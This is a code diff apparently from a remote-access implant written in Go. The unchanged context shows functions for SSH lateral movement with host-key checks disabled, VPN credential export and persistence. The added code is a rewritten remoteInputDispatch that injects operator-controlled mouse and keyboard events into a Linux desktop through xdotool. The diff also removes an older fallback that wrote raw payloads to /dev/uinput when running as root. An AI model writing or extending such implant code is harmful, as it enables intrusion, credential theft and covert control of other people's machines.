@@ -1053,8 +1053,8 @@ func lateralSSH(target, user, pass, cmd string) (string, error) {
 
 	addr := fmt.Sprintf("%s:%d", target, port)
 	config := &ssh.ClientConfig{
-		User:            user,
-		Auth:            authMethods,
+		User: user,
+		Auth: authMethods,
 		// #nosec G106 -- the agent has no known_hosts store; lateral targets are operator-specified.
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // #nosec G106
 		Timeout:         10 * time.Second,
@@ -1484,45 +1484,118 @@ func exportVpnCreds() string {
 	return strings.Join(results, "\n")
 }
 
+// remoteInputDispatch injects one operator input event on Linux through
+// xdotool (X11). The payload is the SAME JSON contract as every other
+// platform: the previous implementation ran `xdotool type <payload>`, which
+// typed the JSON string into whatever window had focus instead of moving the
+// pointer or pressing a key.
 func remoteInputDispatch(payload string) (string, error) {
-	// Use xdotool or ydotool to simulate keyboard input on Linux
-	if payload == "" {
-		return "", fmt.Errorf("remote_input: no payload provided")
+	ev, err := parseRemoteInputEvent(payload)
+	if err != nil {
+		return "", err
 	}
-
-	// Try xdotool first (X11), then ydotool (Wayland)
-	xdotoolCmds := [][]string{
-		{"xdotool", "type", payload},
-		{"xdotool", "key", payload},
+	if _, err := exec.LookPath("xdotool"); err != nil {
+		return "", fmt.Errorf("remote_input: xdotool is required for pointer/keyboard injection on X11 (%v)", err)
 	}
+	mods := normalizeRemoteInputMods(ev.Mods)
 
-	var lastErr string
-	for _, args := range xdotoolCmds {
-		if _, err := exec.Command(args[0], args[1:]...).Output(); err == nil {
-			return fmt.Sprintf("remote_input: sent via %s: %s", args[0], payload), nil
-		} else {
-			lastErr = err.Error()
+	switch ev.Type {
+	case "move":
+		if err := runXdotool("mousemove", strconv.Itoa(ev.X), strconv.Itoa(ev.Y)); err != nil {
+			return "", err
 		}
-	}
-
-	// Try ydotool
-	if _, err := exec.Command("ydotool", "type", payload).Output(); err == nil {
-		return fmt.Sprintf("remote_input: sent via ydotool: %s", payload), nil
-	}
-
-	// Try direct /dev/uinput or /dev/input write (requires root)
-	if os.Geteuid() == 0 {
-		uinputDevices := []string{"/dev/uinput", "/dev/input/uinput"}
-		for _, dev := range uinputDevices {
-			if f, err := os.OpenFile(dev, os.O_WRONLY, 0); err == nil {
-				_, _ = f.Write([]byte(payload))
-				f.Close()
-				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload), nil
-			}
+		return fmt.Sprintf("remote_input: move to (%d,%d)", ev.X, ev.Y), nil
+	case "click", "click_right", "click_middle":
+		if err := runXdotool("mousemove", strconv.Itoa(ev.X), strconv.Itoa(ev.Y)); err != nil {
+			return "", err
 		}
+		button := map[string]string{"click": "1", "click_right": "3", "click_middle": "2"}[ev.Type]
+		count := ev.Count
+		if count < 1 {
+			count = 1
+		}
+		args := []string{"click", "--repeat", strconv.Itoa(count)}
+		if len(mods) > 0 {
+			args = append(args, "--clearmodifiers")
+		}
+		args = append(args, button)
+		if err := runXdotool(args...); err != nil {
+			return "", err
+		}
+		return fmt.Sprintf("remote_input: %s x%d at (%d,%d) injected", ev.Type, count, ev.X, ev.Y), nil
+	case "wheel":
+		if err := runXdotool("mousemove", strconv.Itoa(ev.X), strconv.Itoa(ev.Y)); err != nil {
+			return "", err
+		}
+		// X11 maps wheel notches onto buttons 4 (up) and 5 (down).
+		button := "4"
+		if ev.Delta < 0 {
+			button = "5"
+		}
+		repeat := ev.Delta
+		if repeat < 0 {
+			repeat = -repeat
+		}
+		if repeat < 1 {
+			repeat = 1
+		}
+		if err := runXdotool("click", "--repeat", strconv.Itoa(repeat), button); err != nil {
+			return "", err
+		}
+		return fmt.Sprintf("remote_input: wheel %d at (%d,%d)", ev.Delta, ev.X, ev.Y), nil
+	case "key":
+		name, ok := xdotoolKeyName(ev.Key)
+		if !ok {
+			return "", fmt.Errorf("remote_input: unknown key: %s", ev.Key)
+		}
+		spec := name
+		if len(mods) > 0 {
+			spec = strings.Join(mods, "+") + "+" + name
+		}
+		if err := runXdotool("key", "--clearmodifiers", spec); err != nil {
+			return "", err
+		}
+		return fmt.Sprintf("remote_input: key %s injected (mods=%v)", ev.Key, mods), nil
+	default:
+		return "", fmt.Errorf("remote_input: unknown type: %s", ev.Type)
 	}
+}
 
-	return "", fmt.Errorf("remote_input: failed (install xdotool for X11 or ydotool for Wayland): %s", lastErr)
+func runXdotool(args ...string) error {
+	if out, err := exec.Command("xdotool", args...).CombinedOutput(); err != nil {
+		return fmt.Errorf("remote_input: xdotool %s failed: %v (%s)", strings.Join(args, " "), err, strings.TrimSpace(string(out)))
+	}
+	return nil
+}
+
+// xdotoolKeyName maps the server's key names onto xdotool keysyms. Printable
+// characters are their own keysym for letters and digits; punctuation is
+// spelled out because xdotool would otherwise read "." as a separator.
+func xdotoolKeyName(key string) (string, bool) {
+	named := map[string]string{
+		"enter": "Return", "return": "Return", "tab": "Tab", "space": "space",
+		"backspace": "BackSpace", "escape": "Escape", "esc": "Escape",
+		"left": "Left", "up": "Up", "right": "Right", "down": "Down",
+		"delete": "Delete", "insert": "Insert", "home": "Home", "end": "End",
+		"pageup": "Prior", "pagedown": "Next",
+		"capslock": "Caps_Lock", "numlock": "Num_Lock", "scrolllock": "Scroll_Lock",
+		"printscreen": "Print", "pause": "Pause",
+		"minus": "minus", "equal": "equal", "plus": "plus",
+		"comma": "comma", "period": "period", "dot": "period", "slash": "slash",
+		"semicolon": "semicolon", "quote": "apostrophe", "backtick": "grave",
+		"leftbracket": "bracketleft", "rightbracket": "bracketright", "backslash": "backslash",
+		"win": "Super_L", "meta": "Super_L",
+		"f1": "F1", "f2": "F2", "f3": "F3", "f4": "F4", "f5": "F5", "f6": "F6",
+		"f7": "F7", "f8": "F8", "f9": "F9", "f10": "F10", "f11": "F11", "f12": "F12",
+	}
+	lower := strings.ToLower(strings.TrimSpace(key))
+	if name, ok := named[lower]; ok {
+		return name, true
+	}
+	if len(lower) == 1 {
+		return lower, true
+	}
+	return "", false
 }
 
 func applyPersistence(method string, args string) string {
